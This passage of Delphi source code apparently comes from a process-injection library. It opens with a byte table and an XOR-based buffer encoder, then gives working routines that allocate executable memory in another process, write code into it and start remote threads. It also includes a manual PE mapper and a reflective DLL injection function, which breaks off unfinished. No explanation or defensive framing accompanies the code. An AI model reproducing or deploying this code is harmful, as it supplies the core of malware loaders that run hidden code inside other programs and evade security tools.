    $ED, $EC, $EB, $EA, $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $5D, $5C, $5B, $5A, $59, $58, $57, $56, $55, $54, $53, $52, $85, $10, $4F, $4E,
    $FD, $0C, $4B, $4A, $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E,
    $BF, $FB, $3B, $3A, $01, $F8, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $89, $E7, $27, $26, $99, $E4, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E,
    $37, $CC, $0B, $0A, $59, $C8, $07, $06, $07, $C3, $03, $02, $EF, $BF, $FF, $FE,
    $19, $BB, $FB, $FA, $05, $B7, $F7, $F6, $B7, $B3, $F3, $F2, $9D, $AF, $EF, $EE,
    $CB, $AB, $EB, $EA, $E9, $E8, $E7, $E6, $55, $A3, $E3, $E2, $83, $9F, $DF, $DE,
    $65, $9B, $DB, $DA, $11, $97, $D7, $D6, $D5, $D4, $D3, $D2, $2B, $8F, $CF, $CE,
    $C9, $8E, $CB, $CA, $B3, $8A, $C7, $C6, $DB, $86, $C3, $C2, $79, $82, $BF, $BE,
    $63, $7E, $BB, $BA, $81, $7A, $B7, $B6, $29, $76, $B3, $B2, $1F, $72, $AF, $AE,
    $4B, $6E, $AB, $AA, $33, $6A, $A7, $A6, $DF, $66, $A3, $A2, $FF, $62, $9F, $9E,
    $E3, $5E, $9B, $9A, $8D, $59, $97, $96, $95, $94, $93, $92, $6A, $6B, $61, $64,
    $68, $60, $9C, $9C, $9F, $64, $5B, $5A, $85, $84, $83, $82, $2E, $5F, $56, $4A,
    $3B, $51, $4D, $2B, $50, $4E, $54, $4A, $50, $29, $55, $4C, $4C, $51, $3B, $6E,
    $6D, $6C, $17, $45, $3B, $3B, $3E, $3C, $44, $30, $3E, $0E, $39, $32, $3A, $3D,
    $39, $5C, $5B, $5A, $05, $33, $29, $29, $2C, $2A, $32, $1E, $2C, $00, $21, $23,
    $2E, $27, $1C, $1B, $49, $48, $47, $46, $FA, $14, $1E, $18, $F1, $12, $14, $1F,
    $18, $0D, $0C, $3A, $39, $38, $F8, $08, $10, $13, $FF, $0D, $DD, $08, $01, $09,
    $0C, $08, $2B, $2A, $29, $28, $E8, $FA, $FA, $F5, $FE, $DA, $00, $F6, $FB, $F2,
    $F8, $1C, $1B, $1A, $C9, $EA, $EC, $F7, $F0, $E5, $E4, $23, $23, $C6, $EA, $D6,
    $D9, $B9, $0B, $0A, $09, $08, $B7, $D8, $DA, $E5, $DE, $D3, $D2, $11, $11, $BC,
    $D4, $CE, $CC, $C6, $A6, $F8, $F7, $F6, $B6, $C6, $CE, $D1, $BD, $CB, $9B, $C3,
    $C2, $C0, $C3, $C5, $BD, $B8, $F8, $F8, $96, $BA, $C2, $B2, $B2, $B8, $B4, $AA,
    $DD, $DC, $BA, $B6, $A7, $B7, $A7, $AD, $E6, $E6, $E9, $AE, $A5, $A4, $CF, $CE,
    $CD, $CC, $80, $9A, $A4, $9E, $78, $87, $78, $A3, $99, $A1, $9E, $9B, $91, $6B,
    $BD, $BC, $BB, $BA, $7A, $8C, $8C, $87, $90, $65, $8E, $84, $7F, $87, $90, $89,
    $65, $8B, $81, $86, $7D, $83, $A7, $A6, $A5, $A4, $58, $72, $7C, $76, $50, $79,
    $6F, $6A, $72, $7B, $74, $45, $97, $96, $95, $94, $42, $5D, $6C, $62, $56, $3F,
    $68, $5E, $59, $61, $6A, $63, $38, $52, $64, $50, $4E, $53, $3C, $48, $7F, $7E,
    $53, $48, $57, $4E, $4D, $8E, $53, $4A, $49, $74, $73, $72, $1B, $3D, $2E, $4A,
    $47, $37, $3C, $36, $19, $3A, $3E, $34, $3C, $38, $3E, $3F, $3C, $31, $0B, $33,
    $36, $37, $31, $5A, $59, $58, $01, $23, $0A, $24, $2E, $28, $01, $22, $24, $2F,
    $28, $1D, $1C, $F6, $1E, $21, $22, $1C, $45, $44, $43, $42, $EB, $0D, $FB, $19,
    $11, $1B, $02, $F5, $01, $13, $18, $01, $01, $0B, $08, $08, $31, $30, $2F, $2E,
    $D7, $F9, $DA, $F5, $04, $FA, $EE, $DD, $FB, $02, $F8, $F4, $F4, $FF, $EB, $F5,
    $F2, $F2, $D9, $F1, $ED, $F3, $17, $16, $15, $14, $BD, $DF, $CF, $E2, $EA, $E9,
    $BB, $E3, $DD, $D6, $D4, $E7, $DB, $B9, $E0, $D7, $D8, $D4, $C8, $00, $FF, $FE,
    $A7, $C9, $BA, $CE, $CD, $CD, $D8, $D5, $C1, $CF, $A1, $C9, $C3, $BC, $BA, $CD,
    $C1, $9F, $C6, $BD, $BE, $BA, $AE, $E6, $E5, $E4, $8D, $AF, $96, $B0, $BA, $B4,
    $89, $B4, $AD, $B5, $B8, $B4, $83, $AB, $AE, $AF, $A9, $D2, $D1, $D0, $79, $9B,
    $8E, $A0, $A0, $9B, $A4, $C8, $C7, $C6, $6F, $91, $78, $92, $9C, $96, $6F, $90,
    $92, $9D, $96, $8B, $8A, $B8, $B7, $B6, $5F, $81, $6F, $7D, $81, $84, $86, $8F,
    $8C, $78, $86, $5F, $8B, $82, $82, $87, $71, $A4, $A3, $A2, $4B, $6D, $4E, $69,
    $78, $6E, $62, $4F, $7B, $72, $72, $77, $61, $94, $93, $92, $3B, $5D, $3E, $59,
    $68, $5E, $52, $3B, $50, $59, $53, $61, $58, $3B, $59, $60, $56, $52, $52, $5D,
    $49, $53, $50, $50, $79, $78, $77, $76, $27, $40, $47, $29, $47, $47, $3B, $19,
    $43, $43, $4C, $3F, $45, $43, $18, $32, $37, $3B, $39, $3F, $61, $60, $5F, $5E,
    $07, $29, $0C, $35, $25, $13, $25, $31, $2B, $20, $53, $52, $51, $50, $F9, $1B,
    $02, $1C, $26, $20, $04, $16, $22, $1C, $11, $44, $43, $42, $41, $40, $3F, $3E,
    $3D, $3C, $3B, $3A, $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E,
    $0D, $0C, $0B, $0A, $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE,
    $ED, $EC, $EB, $EA, $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $5D, $4C, $5B, $5A, $E5, $58, $57, $56, $57, $64, $4D, $62, $43, $60, $39, $5E,
    $6F, $5C, $65, $5A, $5B, $58, $51, $56, $07, $54, $FD, $52, $F3, $50, $E9, $4E,
    $1F, $4C, $9D, $4A, $93, $48, $89, $46, $7F, $44, $35, $41, $2B, $3F, $21, $3D,
    $17, $3B, $4D, $39, $43, $37, $39, $35, $2F, $33, $E5, $31, $DB, $2F, $D1, $2D,
    $02, $2D, $D5, $2B, $E5, $29, $B7, $27, $54, $25, $44, $23, $71, $21, $56, $1F,
    $09, $18, $FD, $16, $29, $14, $15, $12, $C5, $10, $DE, $0E, $D7, $0C, $80, $0A,
    $74, $08, $69, $06, $93, $04, $36, $02, $2C, $00, $29, $FE, $35, $FC, $E8, $F9,
    $F6, $F7, $4C, $F5, $36, $F3, $E8, $F4, $C8, $F2, $86, $F0, $BD, $EE, $B4, $EC,
    $A2, $EA, $57, $E8, $50, $E6, $47, $E4, $3B, $E2, $62, $E0, $08, $DE, $FB, $DC,
    $2E, $DA, $1E, $D8, $C6, $D5, $E8, $D3, $DC, $D1, $C7, $CF, $78, $CD, $A0, $CB,
    $2F, $C9, $23, $C7, $55, $C5, $51, $C3, $3F, $C1, $38, $BF, $E7, $BD, $AC, $B6,
    $C9, $B4, $B9, $B2, $A9, $C8, $A7, $A6, $95, $A4, $A3, $A2, $A1, $B0, $9B, $AE,
    $95, $AC, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $5D, $5C, $5B, $5A, $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E,
    $4D, $4C, $4B, $4A, $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E,
    $3D, $3C, $3B, $3A, $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E,
    $0D, $0C, $0B, $0A, $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE,
    $ED, $EC, $EB, $EA, $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $5D, $5C, $5B, $5A, $5B, $31, $46, $59, $55, $54, $53, $52, $51, $50, $4F, $4E,
    $4D, $4C, $4B, $4A, $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E,
    $3D, $3C, $3B, $3A, $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E,
    $0D, $0C, $0B, $0A, $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE,
    $ED, $EC, $EB, $EA, $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E,
    $5D, $5C, $5B, $5A, $59, $58, $57, $56, $55, $54, $53, $52, $51, $50, $4F, $4E,
    $4D, $4C, $4B, $4A, $49, $48, $47, $46, $45, $44, $43, $42, $41, $40, $3F, $3E,
    $3D, $3C, $3B, $3A, $39, $38, $37, $36, $35, $34, $33, $32, $31, $30, $2F, $2E,
    $2D, $2C, $2B, $2A, $29, $28, $27, $26, $25, $24, $23, $22, $21, $20, $1F, $1E,
    $1D, $1C, $1B, $1A, $19, $18, $17, $16, $15, $14, $13, $12, $11, $10, $0F, $0E,
    $0D, $0C, $0B, $0A, $09, $08, $07, $06, $05, $04, $03, $02, $01, $00, $FF, $FE,
    $FD, $FC, $FB, $FA, $F9, $F8, $F7, $F6, $F5, $F4, $F3, $F2, $F1, $F0, $EF, $EE,
    $ED, $EC, $EB, $EA, $E9, $E8, $E7, $E6, $E5, $E4, $E3, $E2, $E1, $E0, $DF, $DE,
    $DD, $DC, $DB, $DA, $D9, $D8, $D7, $D6, $D5, $D4, $D3, $D2, $D1, $D0, $CF, $CE,
    $CD, $CC, $CB, $CA, $C9, $C8, $C7, $C6, $C5, $C4, $C3, $C2, $C1, $C0, $BF, $BE,
    $BD, $BC, $BB, $BA, $B9, $B8, $B7, $B6, $B5, $B4, $B3, $B2, $B1, $B0, $AF, $AE,
    $AD, $AC, $AB, $AA, $A9, $A8, $A7, $A6, $A5, $A4, $A3, $A2, $A1, $A0, $9F, $9E,
    $9D, $9C, $9B, $9A, $99, $98, $97, $96, $95, $94, $93, $92, $91, $90, $8F, $8E,
    $8D, $8C, $8B, $8A, $89, $88, $87, $86, $85, $84, $83, $82, $81, $80, $7F, $7E,
    $7D, $7C, $7B, $7A, $79, $78, $77, $76, $75, $74, $73, $72, $71, $70, $6F, $6E,
    $6D, $6C, $6B, $6A, $69, $68, $67, $66, $65, $64, $63, $62, $61, $60, $5F, $5E
    );

  IMPORTED_NAME_OFFSET = $00000002;
  IMAGE_ORDINAL_FLAG32 = $80000000;
  IMAGE_ORDINAL_MASK32 = $0000FFFF;

type
  TDllEntryProc = function(hinstDLL: HMODULE; dwReason: dword;
    lpvReserved: pointer): boolean; stdcall;

  TSections = array[0..0] of TImageSectionHeader;

  PLibInfo = ^TLibInfo;
  TLibInfo = packed record
    ImageBase: pointer;
    ImageSize: longint;
    DllProc: TDllEntryProc;
    DllProcAddress: pointer;
  end;

  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: dword;
    SizeOfBlock: dword;
  end;

  PImageImportDescriptor = ^TImageImportDescriptor;
  TImageImportDescriptor = packed record
    OriginalFirstThunk: dword;
    TimeDateStamp: dword;
    ForwarderChain: dword;
    Name: dword;
    FirstThunk: dword;
  end;

procedure EncodeBuffer(data: PBYTEBUF; size: DWORD; Key: BYTE); stdcall;
var
  c: integer;
begin
  for c := 0 to size do
    data^[c] := BYTE((not BYTE(data[c]) - c) xor Key);
end;

function GetSectionProtection(ImageScn: dword): dword;
begin
  Result := 0;
  if (ImageScn and IMAGE_SCN_MEM_NOT_CACHED) <> 0 then
    Result := Result or PAGE_NOCACHE;
  if (ImageScn and IMAGE_SCN_MEM_EXECUTE) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
    begin
      if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
        Result := Result or PAGE_EXECUTE_READWRITE
      else Result := Result or PAGE_EXECUTE_READ;

    end
    else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_EXECUTE_WRITECOPY
    else Result := Result or PAGE_EXECUTE;

  end
  else if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_READWRITE
    else Result := Result or PAGE_READONLY;

  end
  else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
    Result := Result or PAGE_WRITECOPY
  else Result := Result or PAGE_NOACCESS;
end;

function InjectMemory(Process: dword; Memory: pointer; Size: dword): pointer;
var
  BytesWritten: dword;
begin
  result := nil;
  ZwAllocateVirtualMemory(Process, @result, 0, @Size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Memory, Size, @BytesWritten);
end;

function InjectThread(Process: dword; Thread: pointer; Info: pointer;
  InfoLen: dword; Results: boolean): THandle;
var
  pThread, pInfo: pointer;
  BytesRead, TID: dword;
begin
  pInfo := InjectMemory(Process, Info, InfoLen);
  pThread := InjectMemory(Process, Thread, SizeOfProc(Thread));
  Result := CreateRemoteThread(Process, nil, 0, pThread, pInfo, 0, TID);
  if Results then
  begin
    ZwWaitForSingleObject(Result, false, nil);
    ZwReadVirtualMemory(Process, pInfo, Info, InfoLen, @BytesRead);
  end;
end;

function InjectString(Process: dword; Text: PChar): PChar;
var
  BytesWritten: dword;
  Size: DWORD;
begin
  result := nil;
  Size := strlenA(Text) + 1;
  BytesWritten := Size;
  ZwAllocateVirtualMemory(Process, @result, 0, @BytesWritten, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Text, Size, @BytesWritten);
end;

function GetProcAddressEx(Process: dword; lpModuleName,
  lpProcName: pchar; dwProcLen: dword): pointer;
type
  TGetProcAddrExInfo = record
    pExitThread: pointer;
    pGetProcAddress: pointer;
    pGetModuleHandle: pointer;
    lpModuleName: pointer;
    lpProcName: pointer;
  end;
var
  GetProcAddrExInfo: TGetProcAddrExInfo;
  BasicInformation: THREAD_BASIC_INFORMATION;
  hThread: dword;

  procedure GetProcAddrExThread(lpParameter: pointer); stdcall;
  var
    GetProcAddrExInfo: TGetProcAddrExInfo;
  begin
    GetProcAddrExInfo := TGetProcAddrExInfo(lpParameter^);
    asm
      push GetProcAddrExInfo.lpModuleName
      call GetProcAddrExInfo.pGetModuleHandle
      push GetProcAddrExInfo.lpProcName
      push eax
      call GetProcAddrExInfo.pGetProcAddress
      push eax
      call GetProcAddrExInfo.pExitThread
    end;
  end;

begin
  Result := nil;
  GetProcAddrExInfo.pGetModuleHandle := GetProcAddress(GetModuleHandleW(kernel32), 'GetModuleHandleA');
  GetProcAddrExInfo.pGetProcAddress := GetProcAddress(GetModuleHandleW(kernel32), 'GetProcAddress');
  GetProcAddrExInfo.pExitThread := GetProcAddress(GetModuleHandleW(kernel32), 'ExitThread');
  if dwProcLen = 4 then GetProcAddrExInfo.lpProcName := lpProcName else
    GetProcAddrExInfo.lpProcName := InjectMemory(Process, lpProcName, dwProcLen);

  GetProcAddrExInfo.lpModuleName := InjectString(Process, lpModuleName);
  hThread := InjectThread(Process, @GetProcAddrExThread, @GetProcAddrExInfo,
    SizeOf(GetProcAddrExInfo), False);

  if hThread <> 0 then
  begin
    ZwWaitForSingleObject(hThread, false, nil);
    memzero(@BasicInformation, sizeof(BasicInformation));
    ZwQueryInformationThread(hThread, ThreadBasicInformation, @BasicInformation, sizeof(BasicInformation), nil);
    result := pointer(BasicInformation.ExitStatus);
  end;
end;

function MapLibrary(Process: dword; Dest, Src: pointer): TLibInfo;
var
  ImageBase: pointer;
  ImageBaseDelta: integer;
  ImageNtHeaders: PImageNtHeaders;
  PSections: ^TSections;
  SectionLoop: integer;
  SectionBase: pointer;
  VirtualSectionSize, RawSectionSize: dword;
  OldProtect: dword;
  bytesIO: DWORD;
  Addr: PChar;
  NewLibInfo: TLibInfo;

  procedure ProcessRelocs(PRelocs: PImageBaseRelocation);
  var
    PReloc: PImageBaseRelocation;
    RelocsSize: dword;
    Reloc: PWord;
    ModCount: dword;
    RelocLoop: dword;
  begin
    PReloc := PRelocs;
    RelocsSize := ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    while dword(PReloc) - dword(PRelocs) < RelocsSize do
    begin
      ModCount := (PReloc.SizeOfBlock - Sizeof(PReloc^)) div 2;
      Reloc := pointer(dword(PReloc) + sizeof(PReloc^));
      for RelocLoop := 0 to ModCount - 1 do
      begin
        if Reloc^ and $F000 <> 0 then Inc(pdword(dword(ImageBase) +
            PReloc.VirtualAddress +
            (Reloc^ and $0FFF))^, ImageBaseDelta);
        Inc(Reloc);
      end;
      PReloc := pointer(Reloc);
    end;
  end;

  procedure ProcessImports(PImports: PImageImportDescriptor);
  var
    PImport: PImageImportDescriptor;
    Import: pdword;
    PImportedName: pchar;
    ProcAddress: pointer;
    PLibName: pchar;

    function IsImportByOrdinal(ImportDescriptor: dword): boolean;
    begin
      Result := (ImportDescriptor and IMAGE_ORDINAL_FLAG32) <> 0;
    end;

  begin
    PImport := PImports;
    while PImport.Name <> 0 do
    begin
      PLibName := pchar(dword(PImport.Name) + dword(ImageBase));

      if PImport.TimeDateStamp = 0 then
        Import := pdword(pImport.FirstThunk + dword(ImageBase))
      else
        Import := pdword(pImport.OriginalFirstThunk + dword(ImageBase));

      while Import^ <> 0 do
      begin
        if IsImportByOrdinal(Import^) then
          ProcAddress := GetProcAddressEx(Process, PLibName, PChar(Import^ and $FFFF), 4)
        else
        begin
          PImportedName := pchar(Import^ + dword(ImageBase) + IMPORTED_NAME_OFFSET);
          ProcAddress := GetProcAddressEx(Process, PLibName, PImportedName, strlenA(PImportedName));
        end;
        Ppointer(Import)^ := ProcAddress;
        Inc(Import);
      end;
      Inc(PImport);
    end;
  end;

begin
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
  ImageBase := Dest;
  ZwAllocateVirtualMemory(NtCurrentProcess, @ImageBase, 0, @bytesIO, MEM_RESERVE, PAGE_NOACCESS);

  ImageBaseDelta := dword(ImageBase) - ImageNtHeaders.OptionalHeader.ImageBase;

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  SectionBase := ImageBase;
  ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

  memcopy(SectionBase, Src, ImageNtHeaders.OptionalHeader.SizeOfHeaders);

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  ZwProtectVirtualMemory(NtCurrentProcess, @SectionBase, @bytesIO, PAGE_READONLY, @OldProtect);

  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) +
    ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    VirtualSectionSize := PSections[SectionLoop].Misc.VirtualSize;
    RawSectionSize := PSections[SectionLoop].SizeOfRawData;
    if VirtualSectionSize < RawSectionSize then
    begin
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
      RawSectionSize := VirtualSectionSize xor RawSectionSize;
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
    end;

    SectionBase := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    bytesIO := VirtualSectionSize;
    ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

    memzero(SectionBase, VirtualSectionSize);
    memcopy(SectionBase, (pchar(src) + PSections[SectionLoop].pointerToRawData), RawSectionSize);
  end;

  NewLibInfo.DllProcAddress := pointer(ImageNtHeaders.OptionalHeader.AddressOfEntryPoint +
    dword(ImageBase));
  NewLibInfo.DllProc := TDllEntryProc(NewLibInfo.DllProcAddress);

  NewLibInfo.ImageBase := ImageBase;
  NewLibInfo.ImageSize := ImageNtHeaders.OptionalHeader.SizeOfImage;

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0
    then ProcessRelocs(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].
      VirtualAddress + dword(ImageBase)));

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress <> 0
    then ProcessImports(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].
      VirtualAddress + dword(ImageBase)));

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    bytesIO := PSections[SectionLoop].Misc.VirtualSize;
    Addr := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    ZwProtectVirtualMemory(NtCurrentProcess, @Addr,
      @bytesIO, GetSectionProtection(PSections[SectionLoop].Characteristics), @OldProtect);
  end;
  Result := NewLibInfo;
end;

function memopen(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, PAGE_EXECUTE_READWRITE, @OldProtect) = STATUS_SUCCESS);
end;

function memclose(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  pr, bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, OldProtect, @pr) = STATUS_SUCCESS);
end;

function InjectDllEx(Process: dword; Src: pointer): boolean;
type
  TDllLoadInfo = packed record
    Module: pointer;
    EntryPoint: pointer;
  end;
var
  Lib: TLibInfo;
  ImageNtHeaders: PImageNtHeaders;
  pModule: pointer;
  OldProtect: DWORD;
  BytesWritten: DWORD;
  Offset: DWORD;
  hThread: DWORD;
  bytesIO: DWORD;
  DllLoadInfo: TDllLoadInfo;

  procedure DllEntryPoint(lpParameter: pointer); stdcall;
  var
    LoadInfo: TDllLoadInfo;
  begin
    LoadInfo := TDllLoadInfo(lpParameter^);
    asm
      xor eax, eax
      push eax
      push DLL_PROCESS_ATTACH
      push LoadInfo.Module
      call LoadInfo.EntryPoint
    end;
  end;

begin
  Result := False;
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));
  Offset := $10000000;
  repeat
    Inc(Offset, $10000);

    pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
    bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
    ZwAllocateVirtualMemory(NtCurrentProcess, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pModule <> nil) then
    begin
      bytesIO := 0;
      ZwFreeVirtualMemory(NtCurrentProcess, @pModule, @bytesIO, MEM_RELEASE);

      bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
      pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
      ZwAllocateVirtualMemory(Process, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    end;
  until ((pModule <> nil) or (Offset > $30000000));
  Lib := MapLibrary(Process, pModule, Src);
  if Lib.ImageBase = nil then Exit;
  DllLoadInfo.Module := Lib.ImageBase;
  DllLoadInfo.EntryPoint := Lib.DllProcAddress;

  ZwWriteVirtualMemory(Process, pModule, Lib.ImageBase, Lib.ImageSize, @BytesWritten);

  hThread := InjectThread(Process, @DllEntryPoint, @DllLoadInfo,
    SizeOf(TDllLoadInfo), False);
  Result := (hThread <> 0);
